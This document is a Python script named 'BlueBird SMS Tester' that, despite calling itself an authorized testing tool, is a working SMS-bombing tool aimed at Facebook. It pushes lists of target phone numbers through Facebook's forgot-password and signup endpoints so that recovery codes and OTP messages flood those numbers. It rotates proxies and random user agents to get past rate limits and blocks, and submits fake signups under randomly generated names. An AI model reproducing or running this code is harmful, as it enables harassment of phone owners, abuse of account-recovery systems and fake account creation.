#!/usr/bin/env python3
"""
BlueBird SMS Tester v1.0
Authorized Security Testing Tool
"""

import os
import sys
import time
import random
import re
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests -q")
    import requests

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    os.system(f"{sys.executable} -m pip install colorama -q")
    from colorama import init, Fore, Style
    init(autoreset=True)

try:
    from fake_useragent import UserAgent
    ua_gen = UserAgent()
except:
    os.system(f"{sys.executable} -m pip install fake_useragent -q")
    from fake_useragent import UserAgent
    ua_gen = UserAgent()

# ============== CONFIG ==============
TARGETS_FILE = "targets.txt"
PROXY_FILE = "proxies.txt"
UA_FILE = "user_agents.txt"
THREAD_COUNT = 2
TOOL_VERSION = "1.0"
# ====================================

targets = []
proxies = []
uas = []
running = False
stats = {"ok": 0, "fail": 0, "total": 0}
stats_lock = threading.Lock()
selected_mode = "forgot"  # "forgot" or "signup"

# =================== HELPER ===================

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_ip_country(proxy_str=None):
    try:
        ip = None
        if proxy_str:
            parts = proxy_str.split(':')
            if parts[0].replace('.','').isdigit():
                ip = parts[0]
        else:
            r = requests.get('https://httpbin.org/ip', timeout=5)
            ip = r.json().get('origin','').split(',')[0].strip()
        if ip:
            r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            if r.status_code == 200 and r.json().get('status') == 'success':
                return r.json().get('countryCode', '??')
    except:
        pass
    return '??'

def current_ip_country():
    if proxies:
        return get_ip_country(proxies[0])
    return get_ip_country(None)

def fmt_num(n):
    n = n.strip()
    if n and not n.startswith('+'):
        n = '+' + n
    return n

def get_proxy_dict(p):
    if not p:
        return None
    parts = p.split(':')
    if len(parts) >= 4:
        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
    else:
        url = f"http://{p}"
    return {'http': url, 'https': url}

def get_ua():
    return random.choice(uas) if uas else ua_gen.random

# =================== FACEBOOK FUNCTIONS ===================

def extract_lsd(session):
    """Extract LSD token from Facebook"""
    try:
        r = session.get('https://www.facebook.com/', headers={'User-Agent': get_ua()}, timeout=15)
        match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"', r.text)
        if match:
            return match.group(1)
        match = re.search(r'name="lsd"[^>]*value="([^"]+)"', r.text)
        if match:
            return match.group(1)
    except:
        pass
    return str(random.randint(100000000000000, 999999999999999))


def send_forgot_password(phone, user_agent_str, proxy=None):
    """Facebook Forgot Password - sends recovery SMS"""
    ses = requests.Session()
    pd = get_proxy_dict(proxy)
    
    try:
        # Step 1: Get initial cookies and LSD
        headers1 = {
            'User-Agent': user_agent_str,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        r1 = ses.get('https://www.facebook.com/login/identify/', headers=headers1, proxies=pd, timeout=20)
        
        lsd = extract_lsd(ses)
        
        # Step 2: Submit forgot password
        headers2 = {
            'User-Agent': user_agent_str,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/login/identify/',
        }
        
        data = {
            'lsd': lsd,
            'email': phone,
            'did_submit': 'Search',
            '__user': '0',
            '__a': '1',
            '__dyn': '',
            '__csr': '',
        }
        
        r2 = ses.post(
            'https://www.facebook.com/login/identify/',
            headers=headers2,
            data=data,
            proxies=pd,
            timeout=20,
            allow_redirects=False
        )
        
        # Step 3: Check if recovery was sent
        if r2.status_code == 200:
            body = r2.text.lower()
            if 'checkpoint' in body or 'recovery' in body or 'code' in body or 'send' in body:
                # Try to follow redirect for confirmation
                if 'location' in r2.headers or 'redirect' in body:
                    return True, "✓ Recovery code sent"
            return True, "✓ Request processed"
        elif r2.status_code == 302:
            return True, "✓ Recovery initiated"
        elif r2.status_code == 429:
            return False, "⏳ Rate limited"
        elif r2.status_code == 403:
            return False, "🔒 Blocked"
        else:
            return False, f"✗ HTTP {r2.status_code}"
            
    except requests.exceptions.ProxyError:
        return False, "✗ Proxy dead"
    except requests.exceptions.Timeout:
        return False, "✗ Timeout"
    except Exception as e:
        return False, f"✗ {str(e)[:40]}"


def send_signup_otp(phone, user_agent_str, proxy=None):
    """Facebook Signup - sends OTP to phone"""
    ses = requests.Session()
    pd = get_proxy_dict(proxy)
    
    try:
        # Step 1: Get signup page for LSD
        headers1 = {
            'User-Agent': user_agent_str,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        r1 = ses.get('https://www.facebook.com/r.php', headers=headers1, proxies=pd, timeout=20)
        
        lsd = extract_lsd(ses)
        
        # Generate random female name
        first_names = ['Maria', 'Anna', 'Sofia', 'Emma', 'Olivia', 'Isabella', 'Mia', 'Charlotte', 'Amelia', 'Harper']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        gender = 1  # female
        dob_day = random.randint(1, 28)
        dob_month = random.randint(1, 12)
        dob_year = random.randint(1985, 2002)
        
        # Step 2: Submit signup form
        headers2 = {
            'User-Agent': user_agent_str,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/r.php',
        }
        
        data = {
            'lsd': lsd,
            'jazoest': str(random.randint(1000, 9999)),
            'firstname': random.choice(first_names),
            'lastname': random.choice(last_names),
            'reg_email__': phone,
            'reg_email_confirmation__': phone,
            'reg_passwd__': 'Test@' + str(random.randint(1000, 9999)),
            'sex': str(gender),
            'birthday_day': str(dob_day),
            'birthday_month': str(dob_month),
            'birthday_year': str(dob_year),
            'reg_instance': str(random.randint(100000000000000, 999999999999999)),
            'reg_present': 'already_have_account',
            'captcha_persist_data': '',
            'captcha_session': '',
            'extra_challenge_data': '',
            'submitted': '1',
            '__user': '0',
            '__a': '1',
        }
        
        r2 = ses.post(
            'https://www.facebook.com/api/graphql/',
            headers=headers2,
            data=data,
            proxies=pd,
            timeout=20,
            allow_redirects=False
        )
        
        # Step 3: Check if we need phone verification OTP
        body = r2.text.lower()
        if 'code' in body or 'confirm' in body or 'otp' in body or 'sms' in body:
            # It's asking for OTP code - means SMS was sent
            return True, "✓ OTP sent to phone"
        elif 'checkpoint' in body:
            return True, "✓ Verification required"
        elif r2.status_code == 200:
            return True, "✓ Account created - OTP sent"
        elif r2.status_code == 429:
            return False, "⏳ Rate limited"
        elif r2.status_code == 403:
            return False, "🔒 Blocked"
        else:
            return False, f"✗ HTTP {r2.status_code}"
            
    except requests.exceptions.ProxyError:
        return False, "✗ Proxy dead"
    except requests.exceptions.Timeout:
        return False, "✗ Timeout"
    except Exception as e:
        return False, f"✗ {str(e)[:40]}"


# =================== WORKER ===================

def worker(number, idx, total):
    global running, stats
    
    if not running:
        return
    
    num = fmt_num(number)
    proxy = random.choice(proxies) if proxies else None
    ua_str = get_ua()
    
    if selected_mode == "forgot":
        ok, msg = send_forgot_password(num, ua_str, proxy)
    else:
        ok, msg = send_signup_otp(num, ua_str, proxy)
    
    with stats_lock:
        stats['total'] += 1
        if ok:
            stats['ok'] += 1
            print(f"  {Fore.GREEN}[✓] [{idx+1}/{total}] {num} → {msg}")
        else:
            stats['fail'] += 1
            print(f"  {Fore.RED}[✗] [{idx+1}/{total}] {num} → {msg}")
    
    time.sleep(random.uniform(3, 7))


# =================== HEADER ===================

def show_header():
    cls()
    cc = current_ip_country()
    n = len(targets)
    m = "Forgot Password" if selected_mode == "forgot" else "New Account OTP"
    
    h = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════╗
║              BLUEBIRD SMS TESTER v{TOOL_VERSION}              ║
║              {m:<39}║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}IP:{Style.RESET_ALL} {Fore.GREEN}{cc:<18}{Style.RESET_ALL} {Fore.WHITE}Targets:{Style.RESET_ALL} {Fore.YELLOW}{n:<5}{Style.RESET_ALL}           ║
║  {Fore.WHITE}Proxies:{Style.RESET_ALL} {Fore.CYAN}{len(proxies):<5}{Style.RESET_ALL}  {Fore.WHITE}UAs:{Style.RESET_ALL} {Fore.CYAN}{len(uas) or 'Auto':<5}{Style.RESET_ALL}              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
    print(h)


# =================== MENUS ===================

def main_menu():
    show_header()
    print(f"{Fore.CYAN}╔══════ BLUEBIRD MAIN MENU ═════════════════════════════╗{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Forgot Password SMS")
    print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} New Account OTP")
    print(f"  {Fore.WHITE}[3]{Style.RESET_ALL} Set Proxy")
    print(f"  {Fore.WHITE}[4]{Style.RESET_ALL} Add Target")
    print(f"  {Fore.WHITE}[5]{Style.RESET_ALL} Add User Agent")
    print(f"  {Fore.GREEN}[6]{Style.RESET_ALL} ▶▶ START ◀◀")
    print(f"  {Fore.RED}[0]{Style.RESET_ALL} Exit")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    return input(f"\n{Fore.YELLOW}┌─[{Fore.GREEN}root{Fore.YELLOW}@{Fore.CYAN}BlueBird{Fore.YELLOW}]─[{Fore.CYAN}Menu{Fore.YELLOW}]\n└──╼ {Style.RESET_ALL}").strip()


def proxy_menu():
    while True:
        show_header()
        print(f"{Fore.CYAN}╔══════ PROXY MENU ═══════════════════════════════════╗{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Add Proxy")
        print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Clear All")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} Back")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Loaded: {len(proxies)}{Style.RESET_ALL}")
        
        c = input(f"\n{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
        
        if c == '1':
            print(f"\n{Fore.CYAN}Paste proxy (IP:Port or IP:Port:User:Pass):{Style.RESET_ALL}")
            p = input(f"{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
            if p:
                proxies.append(p)
                print(f"\n{Fore.GREEN}  ✓ Set Successfully!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif c == '2':
            if proxies:
                print(f"\n{Fore.YELLOW}Are You Sure? (y/n):{Style.RESET_ALL} ", end='')
                c2 = input().strip().lower()
                if c2 == 'y':
                    proxies.clear()
                    print(f"{Fore.GREEN}  ✓ Remove Successfully!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}No proxies to clear.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif c == '0':
            break
        else:
            print(f"{Fore.RED}Invalid!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


def target_menu():
    global targets
    
    while True:
        show_header()
        print(f"{Fore.CYAN}╔══════ TARGET MENU ═══════════════════════════════════╗{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Add")
        print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Clear All")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} Back")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Loaded: {len(targets)}{Style.RESET_ALL}")
        
        c = input(f"\n{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
        
        if c == '1':
            print(f"\n{Fore.CYAN}Paste numbers (one per line, 'done' to finish):{Style.RESET_ALL}")
            added = 0
            while True:
                n = input(f"{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
                if n.lower() == 'done':
                    break
                if n:
                    targets.append(fmt_num(n))
                    added += 1
            if added > 0:
                print(f"\n{Fore.GREEN}  ✓ Add {added} target(s) successfully!{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}No targets added.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Back to Main Menu...{Style.RESET_ALL}")
            break
        
        elif c == '2':
            if targets:
                print(f"\n{Fore.YELLOW}Are You Sure? (y/n):{Style.RESET_ALL} ", end='')
                c2 = input().strip().lower()
                if c2 == 'y':
                    targets.clear()
                    print(f"{Fore.GREEN}  ✓ Remove Successfully!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
                elif c2 == 'n':
                    print(f"{Fore.YELLOW}Remove Cancelled!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Back...{Style.RESET_ALL}")
                    break
            else:
                print(f"\n{Fore.YELLOW}No targets.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif c == '0':
            break
        else:
            print(f"{Fore.RED}Invalid!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


def ua_menu():
    global uas
    
    while True:
        show_header()
        print(f"{Fore.CYAN}╔══════ UA MENU ═══════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Add UA")
        print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Clear All")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} Back")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Loaded: {len(uas) or 'Auto'}{Style.RESET_ALL}")
        
        c = input(f"\n{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
        
        if c == '1':
            print(f"\n{Fore.CYAN}Paste UAs (one per line, 'done' to finish):{Style.RESET_ALL}")
            added = 0
            while True:
                u = input(f"{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
                if u.lower() == 'done':
                    break
                if u:
                    uas.append(u)
                    added += 1
            if added > 0:
                print(f"\n{Fore.GREEN}  ✓ Add {added} UA(s) successfully!{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}No UAs added.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Back to Main Menu...{Style.RESET_ALL}")
            break
        
        elif c == '2':
            if uas:
                print(f"\n{Fore.YELLOW}Are You Sure? (y/n):{Style.RESET_ALL} ", end='')
                c2 = input().strip().lower()
                if c2 == 'y':
                    uas.clear()
                    print(f"{Fore.GREEN}  ✓ Remove Successfully!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
                elif c2 == 'n':
                    print(f"{Fore.YELLOW}Remove Cancelled!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Back...{Style.RESET_ALL}")
                    break
            else:
                print(f"\n{Fore.YELLOW}No UAs.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif c == '0':
            break
        else:
            print(f"{Fore.RED}Invalid!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


def start_attack():
    global running, stats
    
    if not targets:
        print(f"\n{Fore.RED}No targets loaded!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        return
    
    show_header()
    mode_name = "Forgot Password" if selected_mode == "forgot" else "New Account OTP"
    
    print(f"{Fore.CYAN}{'═'*56}")
    print(f"  {Fore.WHITE}MODE:{Style.RESET_ALL}     {mode_name}")
    print(f"  {Fore.WHITE}Targets:{Style.RESET_ALL}  {len(targets)}")
    print(f"  {Fore.WHITE}Proxies:{Style.RESET_ALL}  {len(proxies)}")
    print(f"  {Fore.WHITE}Threads:{Style.RESET_ALL}  {THREAD_COUNT}")
    print(f"{Fore.CYAN}{'═'*56}")
    
    for i, n in enumerate(targets[:5], 1):
        print(f"  {i}. {n}")
    if len(targets) > 5:
        print(f"  ... +{len(targets)-5} more")
    
    print(f"\n{Fore.YELLOW}Start? (y/N): {Style.RESET_ALL}", end='')
    if input().strip().lower() != 'y':
        print(f"{Fore.YELLOW}Cancelled{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        return
    
    running = True
    stats = {"ok": 0, "fail": 0, "total": 0}
    
    print(f"\n{Fore.CYAN}{'═'*56}")
    print(f"  {Fore.GREEN}STARTED - {mode_name}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*56}\n")
    
    t0 = time.time()
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as ex:
        fs = {ex.submit(worker, t, i, len(targets)): i for i, t in enumerate(targets)}
        for f in as_completed(fs):
            if not running:
                break
            f.result()
    
    t = time.time() - t0
    
    print(f"\n{'═'*56}")
    print(f"  Completed in {t:.2f}s")
    print(f"  {Fore.GREEN}OK:   {stats['ok']}{Style.RESET_ALL}")
    print(f"  {Fore.RED}FAIL: {stats['fail']}{Style.RESET_ALL}")
    print(f"  Total: {stats['total']}")
    print(f"{'═'*56}")
    
    running = False
    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


# =================== MAIN LOOP ===================

def main():
    global targets, proxies, uas, selected_mode
    
    for f in [TARGETS_FILE, PROXY_FILE, UA_FILE]:
        if not os.path.exists(f):
            with open(f, 'w') as fh:
                fh.write(f"# {f}\n")
    
    try:
        while True:
            c = main_menu()
            
            if c == '1':
                selected_mode = "forgot"
                print(f"\n{Fore.GREEN}Mode: Forgot Password{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
            
            elif c == '2':
                selected_mode = "signup"
                print(f"\n{Fore.GREEN}Mode: New Account OTP{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
            
            elif c == '3':
                proxy_menu()
            
            elif c == '4':
                target_menu()
            
            elif c == '5':
                ua_menu()
            
            elif c == '6':
                start_attack()
            
            elif c == '0':
                print(f"\n{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
                sys.exit(0)
            
            else:
                print(f"{Fore.RED}Invalid!{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Interrupted.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
